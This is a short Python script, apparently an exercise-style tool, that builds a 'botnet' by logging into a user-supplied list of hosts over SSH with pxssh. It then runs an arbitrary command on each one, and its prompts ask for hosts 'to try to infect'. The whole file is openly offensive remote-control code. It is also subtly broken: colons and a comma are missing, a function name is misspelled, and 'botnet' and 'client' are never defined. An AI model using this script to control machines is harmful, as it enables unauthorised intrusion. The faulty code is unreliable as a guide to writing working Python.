#!/usr/bin/env/python3

""" Creates a botnet from specified hosts (in this case, just loopback)

Arguments: None

"""

import getpass
import pxssh

class Bot:

    def __init__(self, hostname, username, password)
        self.hostname = hostname
        self.username = username
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            session = pxssh.pxssh()
            session.login(self.hostname, self.username, self.password)
            return session
        except Exception as e:
            print(e)
            print('Error connecting to host')

    def send_command(self, command):
        self.session.sendline(command)
        self.session.prompt()
        return self.session.before


def send_command_to_bot(bot, command)

    output = bot.send_command(command)
    print("[*] Current host: " + bot.hostname)
    print("[*] " + output)


def get_user_input()

    bot_list = input("Please enter a comma-separated list of IPs or hostnames to try to infect: ")
    username = input("Please enter the username to attempt the SSH connection as: ")
    password = getpass.getpass("Please enter that username's SSH password: ")
    command = input("Please enter the command you want to try to execute on each bot: ")

    return bot_list, username, password, command


def main():

    # Acquire user input
    bot_list, username, password command = get_user_input()

    for host in bot_list:
        bot = Bot(host, username, password)
        send_commant_to_bot(bot, command)
        botnet.append(client)


if __name__ == '__main__':

    main()
